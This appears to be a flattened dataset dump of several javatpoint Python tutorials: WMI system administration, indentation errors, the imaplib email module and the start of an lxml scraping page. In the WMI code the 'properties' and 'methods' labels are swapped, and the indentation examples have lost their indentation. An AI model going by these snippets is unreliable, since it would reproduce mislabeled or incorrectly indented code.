Windows Management Instrumentation, is an implementation of Microsoft to the Common Information Model (short for CMI) for the DMTF, which is a vendor-neutral, industry-standard method of demonstrating the Management Information. It allows the programmers to query almost any piece of data from any computer executing the required agent with the appropriate permissions.', ""In order to install the Python module, we need 'pip', a framework to manage packages required to install the modules from the trusted public repositories. Once we have 'pip', we can install the wmi module using the command from a Windows command prompt (CMD) or terminal as shown below:"", 'If the above Python program file does not return any error, the module is installed properly. However, in the case where an exception is raised, try reinstalling the module, and it is also recommended to refer to the official documentation of the module.', ""Suppose we want to connect to a remote machine. In that case, we must provide a machine name (or IP Address) and use the following parameters such as 'user' and 'password' to pass the credentials so that we can authenticate the account to establish a remote WMI connection."", ""Now we have the connection established; however, to query specific information regarding the system, we must first find out the WMI class that can deliver that information. We can also use the 'classes' property of WMI objects such as wmi.WMI().classes, in order to return the list of WMI classes."", ""Even if we know the name of WMI Class, we will still need the precise name of the property these classes provide and methods that can carry out particular operations. In order to retrieve methods and properties of an as specific WMI class, we can create a WMI connection and utilize the Dot operator (.) and 'Class Name' in order to access namespace, then 'properties' or 'methods' attribute to return a Python List of property/method names."", ""In the above snippet of code, we have imported the required module. We have then used the WMI() to establish a connection with a remote machine. We have then written the name of the WMI class followed by the Dot operator (.) along with the keywords 'properties' and 'methods' to print all the properties and methods for the users."", 'In the above snippet of code, we have imported the wmi module and established a successful connection with the local machine. We extracted the process list using the for-loop iterating through each process with their ID, Handle Count, and Name of the process.', ""We can also filter these processes with their names and properties to print only selected processes (es). For example, we wanted to select all the processes named as 'code.exe' that are running locally and then filtered out the processes that have to handle count more than 100 with the help of a conditional statement: if<condition>"", 'In the above snippet of code, we have again imported the wmi module and established the connection with a local machine. We have then used the for-loop to iterate through the processes in the WMI class and specified the name of the process to filter out that required process. We have also included the if conditional statement in order to print those processes details only whose Handle Counts is more than 100.', 'In the above snippet of code, we have imported the wmi module and established a successful connection with the local machine. We have then started a new process using the Create() function and stored its process ID. At last, we have used the Terminate() function to kill the process.', 'In the above snippet of code, we have imported the wmi module and established the connection with a local machine. We have then used the for-loop to iterate through the Win32_Services class of the wmi module over the given conditions. We have also used the conditional statement to filter out the required services.']","['$ python.exe -m pip install wmi', 'import wmi', '$ python verify.py', '# connecting to local machine', 'my_connection = wmi.WMI()', '# importing the required module', 'import wmi', '# connecting to a remote machine', 'my_connection = wmi.WMI(""13.78.128.231"", user = r""mango"", password = ""mango@123"")', '# importing the required module', 'import wmi', '# connecting to a local machine', 'my_connection = wmi.WMI()', '# extracting the class names from WMI', 'for className in my_connection.classes:', ""if 'Process' in className:"", 'print(className)', '# importing the wmi module', 'import wmi', '# printing all properties', 'print(""Properties of WMI class:"")', 'print(wmi.WMI().Win32_Process.methods.keys())', '# printing all methods', 'print(""\\nMethods of WMI class:"")', 'print(wmi.WMI().Win32_Process.properties.keys())', '# importing the wmi module', 'import wmi', '# establishing the connection with a local machine', 'my_connection = wmi.WMI()', '# processing list', 'for process in my_connection.Win32_Process():', 'print(""ID: {0}\\nHandle Count: {1}\\nProcess Name: {2}\\n"".format(', 'process.ProcessId, process.HandleCount, process.Name', ')', '# importing the wmi module', 'import wmi', '# establishing the connection with a local machine', 'my_connection = wmi.WMI()', '# filtering specific processes', 'for process in my_connection.Win32_Process(name = ""code.exe""):', 'if process.HandleCount > 100:', '# only processes with Handle Count above 100', 'print(""ID: {0}\\nHandle Count: {1}\\nProcess Name: {2}\\n"".format(', 'process.ProcessId, process.HandleCount, process.Name', ')', ')', '# importing the wmi module', 'import wmi', '# establishing the connection with the local machine', 'my_connection = wmi.WMI()', '# starting a new process and capturing the process ID', 'process_id, return_val = my_connection.Win32_Process.Create(CommandLine = ""notepad.exe"")', '# killing the process using process ID', 'my_connection.Win32_Process(ProcessId = process_id)[0].Terminate()', '# importing the wmi module', 'import wmi', '# establishing connection with a local machine', 'my_connection = wmi.WMI()', '# listing services', 'for service in my_connection.Win32_Service(StartMode = ""Auto"", State = ""Running""):', '# filtering the service names', ""if 'Windows' in service.DisplayName:"", 'print(""Status: {0} \\nStart Mode: {1} \\nService Name: {2} \\nDisplay Name: {3} \\n\\n"".format(', 'service.State, service.StartMode, service.Name, service.DisplayName', ')', ')']","['Win32_ProcessStartTrace', 'Win32_PerfFormattedData_PerfOS_Processor', 'Win32_PerfFormattedData_PerfProc_Process', 'Win32_SessionProcess', 'Win32_PerfRawData_PerfProc_Process', 'Win32_PerfRawData_Counters_PerProcessorNetworkInterfaceCardActivity', 'Win32_PerfRawData_LSM_UserInputDelayperProcess', 'Win32_PerfFormattedData_Counters_ProcessV2', 'Win32_PerfFormattedData_LSM_UserInputDelayperProcess', 'Win32_PerfFormattedData_Counters_PerProcessorNetworkInterfaceCardActivity', 'Win32_Processor', 'Win32_ProcessTrace', 'CIM_OSProcess', 'CIM_ProcessExecutable', 'CIM_Processor', 'CIM_AssociatedProcessorMemory', 'Win32_ComputerSystemProcessor', 'Win32_PerfFormattedData_GPUPerformanceCounters_GPUProcessMemory', 'Win32_PerfRawData_HvStats_HyperVHypervisorLogicalProcessor', 'Win32_PerfFormattedData_Counters_ProcessorInformation', 'CIM_ProcessThread', 'CIM_Process', 'Win32_PerfFormattedData_Counters_PerProcessorNetworkActivityCycles', 'Win32_AssociatedProcessorMemory', 'Win32_PerfRawData_HvStats_HyperVHypervisorRootVirtualProcessor', 'Win32_PerfFormattedData_Counters_SecurityPerProcessStatistics', 'Win32_ProcessStartup', 'Win32_PerfRawData_GPUPerformanceCounters_GPUProcessMemory', 'Win32_PerfRawData_Counters_ProcessorInformation', 'Win32_PerfRawData_Counters_ProcessV2', 'Win32_PerfRawData_Counters_PerProcessorNetworkActivityCycles', 'Win32_PerfRawData_Counters_SecurityPerProcessStatistics', 'Win32_PerfFormattedData_HvStats_HyperVHypervisorLogicalProcessor', 'Win32_Process', 'Win32_PerfFormattedData_HvStats_HyperVHypervisorRootVirtualProcessor', 'Win32_NamedJobObjectProcess', 'Win32_SystemProcesses', 'Win32_ProcessStopTrace', 'Win32_PerfRawData_PerfOS_Processor', 'Properties of WMI class:', ""dict_keys(['Create', 'Terminate', 'GetOwner', 'GetOwnerSid', 'SetPriority', 'AttachDebugger', 'GetAvailableVirtualSize'])"", 'Methods of WMI class:', ""dict_keys(['Caption', 'CommandLine', 'CreationClassName', 'CreationDate', 'CSCreationClassName', 'CSName', 'Description', 'ExecutablePath', 'ExecutionState', 'Handle', 'HandleCount', 'InstallDate', 'KernelModeTime', 'MaximumWorkingSetSize', 'MinimumWorkingSetSize', 'Name', 'OSCreationClassName', 'OSName', 'OtherOperationCount', 'OtherTransferCount', 'PageFaults', 'PageFileUsage', 'ParentProcessId', 'PeakPageFileUsage', 'PeakVirtualSize', 'PeakWorkingSetSize', 'Priority', 'PrivatePageCount', 'ProcessId', 'QuotaNonPagedPoolUsage', 'QuotaPagedPoolUsage', 'QuotaPeakNonPagedPoolUsage', 'QuotaPeakPagedPoolUsage', 'ReadOperationCount', 'ReadTransferCount', 'SessionId', 'Status', 'TerminationDate', 'ThreadCount', 'UserModeTime', 'VirtualSize', 'WindowsVersion', 'WorkingSetSize', 'WriteOperationCount', 'WriteTransferCount'])"", 'ID: 0', 'Handle Count: 0', 'Process Name: System Idle Process', 'ID: 4', 'Handle Count: 5863', 'Process Name: System', 'ID: 160', 'Handle Count: 0', 'Process Name: Registry', 'ID: 540', 'Handle Count: 57', 'Process Name: smss.exe', 'ID: 788', 'Handle Count: 773', 'Process Name: csrss.exe', 'ID: 892', 'Handle Count: 149', 'Process Name: wininit.exe', 'ID: 912', 'Handle Count: 765', 'Process Name: csrss.exe', 'ID: 964', 'Handle Count: 714', 'Process Name: services.exe', 'ID: 984', 'Handle Count: 1571', 'Process Name: lsass.exe', 'ID: 568', 'Handle Count: 267', 'Process Name: winlogon.exe', 'ID: 1056', 'Handle Count: 1746', 'Process Name: svchost.exe', 'ID: 1084', 'Handle Count: 33', 'Process Name: fontdrvhost.exe', '.', '.', '.', 'ID: 14104', 'Handle Count: 301', 'Process Name: python3.9.exe', 'ID: 10464', 'Handle Count: 859', 'Process Name: Code.exe', 'ID: 14796', 'Handle Count: 228', 'Process Name: Code.exe', 'ID: 12388', 'Handle Count: 704', 'Process Name: Code.exe', 'ID: 2504', 'Handle Count: 284', 'Process Name: Code.exe', 'ID: 1044', 'Handle Count: 485', 'Process Name: Code.exe', 'ID: 12668', 'Handle Count: 334', 'Process Name: Code.exe', 'ID: 8088', 'Handle Count: 362', 'Process Name: Code.exe', 'ID: 10720', 'Handle Count: 180', 'Process Name: Code.exe', 'ID: 8976', 'Handle Count: 210', 'Process Name: Code.exe', 'ID: 14804', 'Handle Count: 278', 'Process Name: Code.exe', 'Status: Running', 'Start Mode: Auto', 'Service Name: AudioEndpointBuilder', 'Display Name: Windows Audio Endpoint Builder', 'Status: Running', 'Start Mode: Auto', 'Service Name: Audiosrv', 'Display Name: Windows Audio', 'Status: Running', 'Start Mode: Auto', 'Service Name: EventLog', 'Display Name: Windows Event Log', 'Status: Running', 'Start Mode: Auto', 'Service Name: FontCache', 'Display Name: Windows Font Cache Service', 'Status: Running', 'Start Mode: Auto', 'Service Name: mpssvc', 'Display Name: Windows Defender Firewall', 'Status: Running', 'Start Mode: Auto', 'Service Name: StiSvc', 'Display Name: Windows Image Acquisition (WIA)', 'Status: Running', 'Start Mode: Auto', 'Service Name: Wcmsvc', 'Display Name: Windows Connection Manager', 'Status: Running', 'Start Mode: Auto', 'Service Name: Winmgmt', 'Display Name: Windows Management Instrumentation', 'Status: Running', 'Start Mode: Auto', 'Service Name: WpnService', 'Display Name: Windows Push Notifications System Service', 'Status: Running', 'Start Mode: Auto', 'Service Name: WSearch', 'Display Name: Windows Search', 'Status: Running', 'Start Mode: Auto', 'Service Name: WpnUserService_a17f9', 'Display Name: Windows Push Notifications User Service_a17f9']",[],[]
387,['Indentation Error in Python'],"['Before understanding the indentation problem in python, let us look at the brief about the python programming language.']","['https://www.javatpoint.com/python-imaplib-module', 'https://www.javatpoint.com/windows-system-administration-management-using-python', 'https://www.javatpoint.com/python-imaplib-module', 'https://www.javatpoint.com/windows-system-administration-management-using-python', 'https://www.javatpoint.com/python-imaplib-module']","['https://static.javatpoint.com/python/images/indentation-error-in-python1.png', 'https://static.javatpoint.com/python/images/indentation-error-in-python2.png', 'https://static.javatpoint.com/python/images/indentation-error-in-python3.png', 'https://static.javatpoint.com/python/images/indentation-error-in-python4.png', 'https://static.javatpoint.com/python/images/indentation-error-in-python5.png', 'https://static.javatpoint.com/python/images/indentation-error-in-python6.png', 'https://static.javatpoint.com/python/images/indentation-error-in-python7.png']",[],"['What makes python different from other programming languages?', 'What is an indentation in Python Programming Language?', 'Some basic Indentation Rules that are used in Python programming Language', 'How do indentation errors Occur in Python?', 'How to fix indentation error in a python programming language?', 'Advantages of Indentation in Python', 'Disadvantages of Indentation in Python']","['Description of the above figure -', 'Examples of Python Indentation Error:', 'Now Fixing the Indentation Error in the above examples of python Programs :']",[],"[""Now let's discuss the concept of indentation in python."", 'Let us understand with the help of an example -', 'In the above figure, if we observe that it is mentioned how python recognises every block of code.', 'In this way, in the python programming language the indentation of a block matches.', 'Now let us see the figure having indentation error -', 'There are points that one must remember while fixing the indentation error :', 'As we have seen earlier, indentation error occurs only due to the unmatched whitespaces and tabs; hence, we need to fix all the whitespaces and tabs.', 'Example 1:', 'The output of the above program:', 'Example 2:', 'The output of the above program:', 'Example 3:', 'The output of the above program:', 'Example 1:', 'The output of the above program: ', 'Example 2:', 'The output of the above program: ', 'Example 3:', 'The output of the above program:']","['If we are writing a certain code of lines based on some logic to get the desired result, but, meanwhile, we are following the above rules of indentation. The compiler will generate an indentation error.', 'An indentation error occurs whenever there is no ending of the particular block, or the number of whitespaces assigned for starting the code block is not the same. At the same time that blocks ends, ultimately, an indentation error occurs.']","['As we will notice in this figure, the indentation of every block is the calculation of whitespaces from the left corner to the statement began. Whenever the particular block of code starts, it will follow the indentation. At first, it will maintain the proper whitespaces and tabs, whenever the block starts and until it ends. If in the case inside that particular block includes a nested block, it will assign whitespaces to it till that nested block ends.', 'The figure mentioned above clearly has an indentation error because the block 2 indentation does not match the starting and ending point whitespaces. The beginning of block 2 will contain 0 whitespaces, but while it ends, it contains 2 whitespaces which will produce an error.', 'Now a doubt arises that, if block 2 below block 3 can act as block 4 a nested block, then it will not generate an indentation error, then the answer of this doubt is no because block 4; a nested block below block 3 will have more whitespaces as compare to the block 3. After all, it is nested inside block 3. And the second reason is that the python interpreter will find the end of block 2, but it will be unable to detect the matching whitespaces from block 2; hence it will generate an indentation error.']","['# Python program to find the maximum out of two numbers:', 'def max(x,y):  # max function will return the maximum among the two numbers', 'if(x>y):', 'return x', 'else:', 'return y', 'a = int(input(""Enter a number: ""))', 'b = int(input(""Enter another number: ""))', 'print(""Finding the Maximum out of a:"", a ,""and b:"", b)', 'c=max(a,b)     # calling the max function', 'print(c,""is maximum"")           # printing the result', '# Python program to find the maximum out of three numbers:', 'def max(x,y,z):  # max function will return the maximum among the three numbers', 'if(x>y):', 'if(x>z):', 'return x', 'else:                                                # Nested if else block', 'return z', 'else:', 'if(y>z):', 'return y', 'else:', 'return z', 'a = int(input(""Enter first number: ""))', 'b = int(input(""Enter second number: ""))', 'c = int(input(""Enter third number: ""))', 'print(""Finding the Maximum out of a:"", a ,""and b:"", b, ""and c:"",c)', 'd=max(a,b,c)     # calling the max function', 'print(d,""is maximum"")           # printing the result', '# Python program to calculate the grade from the given result of a student:', '# Grade function is used to obtain the corresponding grade from the given result', 'def grade(x):', 'if(x>=95):', ""return 'A+'"", 'elif(90<=x<95):', ""return 'A'"", 'elif(85<=x<90):', ""return 'B+'"", 'elif(80<=x<85):', ""return 'B'"", 'elif(70<=x<80):', ""return 'B-'"", 'elif(60<=x<70):', ""return 'C'"", 'elif(40<=x<60):', ""return 'D'"", 'else:', ""return 'FAIL'"", 'a=int(input(""Enter total marks of a student: ""))', 'print(""Finding the grade obtained by a student from the given marks: "")', 'g=grade(a)', '# Printing the result', 'print(""Result of a student having marks:"",a,""obtained grade is:"",g)', '# Python program to find the maximum out of two numbers:', 'def max(x,y):  # max function will return the maximum among the two numbers', 'if(x>y):', 'return x', 'else:', 'return y', 'a = int(input(""Enter a number: ""))', 'b = int(input(""Enter another number: ""))', 'print(""Finding the Maximum out of a:"", a ,""and b:"", b)', 'c=max(a,b)     # calling the max function', 'print(c,""is maximum"")           # printing the result', '# Python program to find the maximum out of three numbers:', 'def max(x,y,z):  # max function will return the maximum among the three numbers', 'if(x>y):', 'if(x>z):', 'return x', 'else:                                                # Nested if else block', 'return z', 'else:', 'if(y>z):', 'return y', 'else:', 'return z', 'a = int(input(""Enter first number: ""))', 'b = int(input(""Enter second number: ""))', 'c = int(input(""Enter third number: ""))', 'print(""Finding the Maximum out of a:"", a ,""and b:"", b, ""and c:"",c)', 'd=max(a,b,c)     # calling the max function', 'print(d,""is maximum"")           # printing the result', '# Python program to calculate the grade from the given result of a student:', '# Grade function is used to obtain the corresponding grade from the given result', 'def grade(x):', 'if(x>=95):', ""return 'A+'"", 'elif(90<=x<95):', ""return 'A'"", 'elif(85<=x<90):', ""return 'B+'"", 'elif(80<=x<85):', ""return 'B'"", 'elif(70<=x<80):', ""return 'B-'"", 'elif(60<=x<70):', ""return 'C'"", 'elif(40<=x<60):', ""return 'D'"", 'else:', ""return 'FAIL'"", 'a=int(input(""Enter total marks of a student: ""))', 'print(""Finding the grade obtained by a student from the given marks: "")', 'g=grade(a)', '# Printing the result', 'print(""Result of a student having marks:"",a,""obtained grade is:"",g)']","['IndentationError: expected an indented block', 'IndentationError: expected an indented block', 'IndentationError: expected an indented block']",[],"[""|||Python is an interpreted, high-level and object-oriented programming language along with having dynamic semantics.|||It has a very simple syntax, and it is very easy to implement compared with the other programming languages.|||Using python, programmers can focus on logic building rather than remembering the syntax or facing a problem to implement the logic in coding.|||It is a dynamic and smart high-level language and is most widely used among various users.|||We compare the python programming language syntax with other programming languages, like C, C++, Java, and many more that have followed the particular syntax. For every block of code, there are opening and closing braces.|||But in python, we will follow the proper rule of indentation.|||Indentation refers to the proper participation of white space while starting a particular block of code.|||It is not too much complicated and not more focused on the syntax.|||It is much faster and efficient than the other programming languages.|||Python code can be easily implemented and easily written, and easily be executable.||||||Indentation refers to implementing proper spaces and tabs at starting any statement, method and block of code in the python programming language.|||Due to these indentations, we can easily identify the beginning point and at the endpoint of any conditional loop, functions, if-else statements and so on.|||Suppose we observe the other programming languages like C, C++, and Java. In that case, there is the use of small and curly braces along with the semicolon for specifying the particular block of code and identifying the particular statement.|||But here in python, we will not be concerned about using the semicolon and different braces in syntax.|||There is no importance of spaces in C. Other programming languages or the compiler will ignore all the whitespace and comments, in the lexical phase itself, in the starting phase; hence, it cannot generate syntax errors.|||The role of all whitespaces matters; if a block of code is starting by applying a white space, it must end on the same indent.|||All statements must have the same number of whitespaces or tabs so that the distance to the left of the screen belongs to the same block of code. If a block has to be more deeply nested, it is indented further to the right.|||Suppose we observe in the python programming language. In that case, there is no concept of the main function, as we compared it with other programming languages. They all have a concept of the main function, which is executed after then other functions. If the main function calls the other function, the pointer will point to execute the other functions and again return to the main function.|||Due to the indentation, it is decided that the initial indented block is the body of the main function. If there are other functions, then the initial indented block will call that function. The indentation of the additional function is also different from the main body so that the compiler can distinguish the block of the main and derived function.||||||There is a proper indentation for a particular block of code that must be maintained while beginning and ending any code block.|||A programmer can split the indentation into multiple lines by using a backslash.|||If any block where proper indentation is not maintained, the python compile will throw the indentation error.|||Being consistent in following the indentation rule is quite confusing for a programmer if the code is too large or contains lots of lines of code.|||But indentation helps us implement the code using simple syntax, rather than applying brackets for every block of code, as we do in other programming languages.|||Not only it is easy for us, but also it saves our time and reduces the lines of code; hence ultimately, speed increases and execution tile reduces.|||The number of whitespace for a particular block of code is already fixed. If we use nested conditional statements, then the number of whitespaces has increased, according to the rule of sub-sub statements.||||||In the above figure, statement one will be executed. Then, the pointer will point to the ' if statement ' and check the condition; if the condition is true, it will enter the block and enter the nested if-else block.|||Again in the nested if statement, it will check the condition if it is true, then executes the next statement.|||In this way, the execution of the statements will be carried on, now; if we take a case where the block fails, it will not enter into the nested if-else block. It directly exit out form all the blocks and the final statement will execute, which matches with the block 1, initial block.||||||Firstly you need to find the error in a particular line of code.|||After that, check the number of whitespaces in that line and detect the block of code in which that line lies.|||Match the indentation of that block with the ending and starting point of that block by calculating the number of whitesces used in the starting and at the ending of that block.|||Still, if the error is not resolved, match the indentation of every block of code with another corresponding block of code by using the same way calculating the whitespaces and tabs used in it.|||Also, you take the help of the editor that you are using to check the number of whitespaces and tabs used, and you can easily detect from it by finding out the unnecessary whitespaces used.||||||Indentation is used in python to represent a certain block of code, but in other programming languages, they refer to various brackets. Due to indentation, the code looks more efficient and beautifully structured.|||Indentation rules used in a python programming language are very simple; even a programmer wants their code to be readable.|||Also, indentation increases the efficiency and readability of the code by structuring it beautifully.||||||Due to the uses of whitespaces in indentation, sometimes it is a very tough task to fix the indentation error when there are many lines of code.|||The various popular programming languages like C, C++, Java use braces for indentation, so anybody coming from the other side of the developed world finds it hard to adjust to the idea of using whitespaces for the indentation.|||""]"
388,['Python imaplib Module'],"[""It happens many times when we want to retrieve information or data from our mail through a program, but we don't want to download the mail on our device. This even happens when we want just to fetch the information and look for some particular data from the mail.""]","['https://www.javatpoint.com/python-lxml-module', 'https://www.javatpoint.com/indentation-error-in-python', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com/python-lxml-module', 'https://www.javatpoint.com/indentation-error-in-python', 'https://www.javatpoint.com/python-lxml-module']",['https://static.javatpoint.com/python/images/python-imaplib-module.png'],[],"['imaplib Module of Python', 'Conclusion']","['imaplib Module of Python: Installation', 'IMAP Protocol in Python', 'Key Points for IMAP Protocol:', 'IMAP Commands', 'imaplib Module of Python: Implementation']","['Note: We have used the pprint module in the program, which is also an in-built module of Python, and it is important to use it to print the data in the output.']","['Look at the following Python program where we will use the imaplib module and make a connection with the email server:', 'As we can see, data from the emails present in the inbox is printed in the output and the output will be different for everyone.']","[""We will learn about this 'imaplib' module of Python and IMAP protocol in this tutorial, and we will also learn how we can use this protocol to retrieve information from emails."", ""These classes of imaplib module are used to set up a communication with the server while we are using the IMAP protocol to access our emails' data through a Python program."", 'Following are some key points of IMAP protocol that we have to remember and are very useful for us while we are using this protocol for retrieving data from emails through it:']","[""We have many Python modules through which we can fetch the data of our emails using a program, but most of these modules download the mail while retrieving information from them. This is exactly what we don't want because we don't need to save the mail's information in the system or many times we are working on other's system, and we only have to take a look at some specific information present in our emails. But there are some modules and protocols are available in Python through which we can retrieve the information from our emails without actually downloading them in the system. One of such modules in Python is the 'imaplib' module which provides us access to IMAP protocol for accessing and retrieving data from the mail."", 'imaplib is a Python module or library that provide us with client classes so that we can set up communication with IMAP version 4 servers, and through this IMAP communication, we can retrieve data from our emails. imaplib library provides us with three client classes that are used while communicating with the servers using the IMAP protocol in Python. Following are three client classes that are provided to us in the imaplib module of Python:', ""The imaplib module is a pre-installed library of Python that comes with the Python installation packages, and that's why we don't have to do any installation process for installing this library. Instead of it, we can directly use the function of the imaplib module in a Python program by importing it into the program using the 'import' keyword."", ""IMAP is an email retrieval protocol that stands for Internet Mail Access Protocol, and we will use this protocol through a Python program to have access to data present in our email. IMAP protocol was first proposed in 1986, and this module does not download the emails in our system for retrieving data from them. IMAP module just reads the data present in our emails and displays them in the program's output. This protocol is very helpful in the devices that are present in the low bandwidth condition. We have to use the IMAP module with the imaplib module of Python (which is a client-side library) to retrieve data from our emails. The IMAP module will use the client classes of the imaplib module and set up communication with the server so that it can retrieve data from the emails and show them to us in the output."", 'These are some of the key points of the IMAP protocol which we should remember, and it will be very helpful for us while we are using this protocol in a Python program. We can perform all the actions that are mentioned above in the key points of the IMAP protocol.', 'IMAP protocol has several different commands which are used to perform several different actions through it. Using these commands of IMAP protocol, we can perform multiple actions on our email box, and thus these commands help us to retrieve information from our emails. Following are the list of commands of IMAP protocol with their description, in which some of them we are going to use in the implementation part of this protocol:', 'These are the important command of IMAP protocol. We have to use these commands while using the IMAP protocol to retrieve information from the mail and make changes in the mailbox. We also use these commands while we are making or closing the connection with the email server.', 'We have learned the IMAP protocol and the commands from this protocol used to retrieve information from emails and make changes in the mailbox in the previous sections of this tutorial. We implement this IMAP protocol in Python through the imaplib module by using the functions from this module in a program. To learn how to implement IMAP protocol through the imaplib module, we will use an example program where we use functions from this module and communicate with the email server.', ""Explanation: We have first imported the imaplib and pprint module in the program to use their functions for implementing the IMAP protocol. We imported imaplib as imp and pprint module as pp in the program. After that, we have initialized the imapHostServer variable in which we defined the server path for the email. Then, we have initialized two variables, i.e., imapUserEmail and imapPassword, in which we defined the User Email ID and password of the email (The password we defined in the program is not the correct password for security reasons), respectively. One can use their email ids and password while implementing this program in their system. After that, we defined the imapVar variable in which we used the IMAP4_SSL() function from the imaplib module, using imapHostServer as an argument in the function. This function will make connections with the email server, and then we use the login() function to access our emails. We have used imapUserEmail & imapPassword as arguments in the login() function as the Email Id & password of our email account. Then, we used the select() function to select the 'Inbox' mailbox and retrieve emails present in the inbox. After that, we used the search() function to search for the data from emails present in the inbox. In last, we used for loop to loop over all the emails present in the inbox and retrieve information from them in the output. We have used the fetch() function in the for loop to fetch data from the emails and the pprint() function to print the information present in the mail."", 'We can use the IMAP protocol to retrieve data from our emails without actually downloading them in our system. To implement the IMAP protocol, we have to imaplib module, which provides us with three IMAP client classes. We can use various commands of IMAP to perform multiple functions in our email. We have to use the imaplib module in a Python program to implement the IMAP protocol and fetch data or maintain a connection from emails.']","['# Import imaplib library in the program', 'import imaplib as imp', '# Also import the pprint module', 'import pprint as pp', '# Targeting the host server for email', ""imapHostServer = 'imap.gmail.com'"", '# User email id', ""imapUserEmail = 'forpythoncontent@gmail.com'"", '# Password for user Email', ""imapPassword = 'NotAPassword'"", '# Connecting to host server using SSL client class', 'imapVar = imp.IMAP4_SSL(imapHostServer)', '# Login to the email server with credentials', 'imapVar.login(imapUserEmail, imapPassword)', '# Mailbox folder where emails are present', ""imapVar.select('Inbox')"", '# Searching data through the mail', ""tmp, data = imapVar.search(None, 'ALL')"", '# Using for loop to print data', 'for n in data[0].split():', ""tmp, data = imapVar.fetch(n, '(RFC822)')"", ""print('Message: {0}\\n'.format(n))"", 'pp.pprint(data[0][1])', '# Closing the connection with the server', 'imapVar.close()']","[""Message: b'1'"", ""(b'Delivered-To: [email\xa0protected]\\r\\nReceived: by 2002:a05:6839:408'"", ""b'e:0:0:0:0 with SMTP id dt14csp1139908nkc;\\r\\n        Thu, 18 Nov 2021 21:1'"", ""b'8:23 -0800 (PST)\\r\\nX-Received: by 2002:a02:6901:: with SMTP id e1mr248002'"", ""b'85jac.0.1637299103144;\\r\\n        Thu, 18 Nov 2021 21:18:23 -0800 (PST)\\r\\nA'"", ""b'RC-Seal: i=1; a=rsa-sha256; t=1637299103; cv=none;\\r\\n        d=google.com'? https://notifications.google.c=\\r\\nom/'"", ""b'g/img/AD-FnEznfDyGI_ixnq3rHvh5p8bctFcd4ga52j55D-mp0uud4w.gif></body>\\r\\n  '"", ""b'</html>\\r\\n\\r\\n--000000000000b5138a05d11d6681--\\r\\n')""]","[""S No|||IMAP command|||Description of Command&&&1|||LOGIN|||This command is used to open the connection with the email server by logging into the server through the credentials we will provide.&&&2|||SELECT|||We use this command to select the mailbox folder which mail we want to access, and thus it accesses all the emails present in the mailbox. We can even make changes in the mailbox after selecting the mailbox through this SELECT command.&&&3|||CAPABILITY|||We can use this command when we want to know the capabilities that the server supports, and we can do this by requesting from the server for listing its capabilities.&&&4|||CREATE|||When we want to create a mailbox with some specified name, we can use this CREATE command of the IMAP protocol.&&&5|||NOOP|||The NOOP command acts like and is used as a periodic poll to alert us about new messages or any update on message status during some period of inactivity by us.&&&6|||EXAMINE|||The EXAMINE command works the same as the SELECT command, but the only difference between these commands is that EXAMINE command doesn't allow to make any changes in the mailbox. This command only allows us to read and retrieve information from the mail and check how many emails are present in the selected mailbox.&&&7|||RENAME|||When we want to change the name of a mailbox from our email, we have to use the RENAME to perform the same.&&&8|||DELETE|||DELETE command is used to permanently delete the emails present in the mailbox we have selected or created, and action performed by this command cannot be undone.&&&9|||LOGOUT|||When we are not using the IMAP protocol or when we have done our work with the emails, then we want to close the connection with the email server, and we can do this using the LOGOUT command. This command informs the email server that the user is done with the session, and now the session should be closed. The server will first send the BYE response through the protocol, followed by the OK response from the client-side and then the connection with the server will be closed.""]","['|||IMAP_4|||IMAP4_Stream|||IMAP_SSL||||||We should remember that the email from which we retrieve the data through IMAP protocol is held and maintained by a remote server.|||IMAP protocol also helps us search through the emails by establishing a connection with the server by using client classes of the imaplib module.|||IMAP protocol also allows client programs (Python program in which we will use this protocol) to manipulate our emails on the server without downloading them to our devices or on the local computer.|||IMAP protocol also enables us to delete, manipulate, or create a single or multiple remote message folder which is called mailboxes.|||IMAP module also allows concurrent access to multiple mailboxes (or multiple email accounts), and it will be present on multiple mail servers.|||IMAP protocol also allows us to take various actions on the emails without even reading the email, such as deleting the mail, downloading the mail, etc.|||']"
389,['Python lxml Module'],"[""We all must have heard of web scrapping and how information is scrapped from websites using web scrapping. Web scrapping is very important because it helps us to get all the useful information from a webpage or website, and we can get whatever information we want from that webpage. Now, many of us would think about why it is important that we first fetch information from the webpage and why don't we directly visit the webpage to look at the information? There are two main purposes behind using the web scrapping process, which is following:""]","['https://www.javatpoint.com/python-mayavi-module', 'https://www.javatpoint.com/python-imaplib-module', 'https://www.javatpoint.com/python-mayavi-module', 'https://www.javatpoint.com/python-imaplib-module', 'https://www.javatpoint.com/python-mayavi-module']","['https://static.javatpoint.com/python/images/python-lxml-module.png', 'https://static.javatpoint.com/python/images/python-lxml-module2.png', 'https://static.javatpoint.com/python/images/python-lxml-module3.png', 'https://static.javatpoint.com/python/images/python-lxml-module4.png', 'https://static.javatpoint.com/python/images/python-lxml-module5.png', 'https://static.javatpoint.com/python/images/python-lxml-module6.png', 'https://static.javatpoint.com/python/images/python-lxml-module7.png']",[],['lxml Module in Python'],"['lxml Module in Python: Installation', 'lxml Module in Python: Implementation of Web Scrapping', 'xpath for a Web Link:', 'Implementation of Web Scrapping:']","['Note: We should note that while performing web scrapping on any webpage or web link, we have to take prior permission from some websites to do so; otherwise, it would be considered illegal. One more thing we should keep in mind while implementing web scrapping is that sending multiple web scrapping requests to a single website may result in blocking from that site.', 'Note: Before we proceed with the implementation part of web scrapping with the lxml module, we should note that we need one more Python module while performing web scrapping with the lxml module. We need to have the Python requests module installed in our system along with the lxml module if we want to perform web scraping using the lxml module. This is because the request module of Python will make requests with the websites or web pages on which we want to perform the web scraping. The requests module of Python is also not an in-built module, and therefore, we should make sure that this module is also present in our system. If the request module is not installed in our system, then again, we can use the pip installer to install this module. We have to use the following command in the cmd terminal:']","['Following are the functions that can be performed by using the lxml module in a Python program:', 'And, after writing the command, we have to follow the process and wait for a while until the installation process of the request module is completed.', 'Steps for Implementing Web Scrapping through the lxml Module:', 'After deciding and fixing these things in the program, we can execute the program and implement web scrapping through the lxml module.', 'Implementation 1: Getting Price List using the Web Scrapping with lxml Module:', 'Example 1:', ""As we can see, the price list from the 'new releases' URL is successfully Printed in the output, and we can even save this list for further use."", 'Explanation:', 'Implementation 2: Getting Title List from the URL using lxml Module:', 'Example 2:', ""As we can see, the title list from the 'new releases' URL is successfully Printed in the output, and we can even save this list for further use.""]","[""In this tutorial, we are only going to learn about the lxml module's implementation in web scrapping and how we can use the functions of this module to perform web scraping."", 'As we can see, the lxml module is successfully installed in the system, and now we can import this module into our Python program to implement the web scraping process with the help of its functions.', 'We can see that Python Requests Module is successfully installed in our system, and now we can move ahead with the implementation part of web 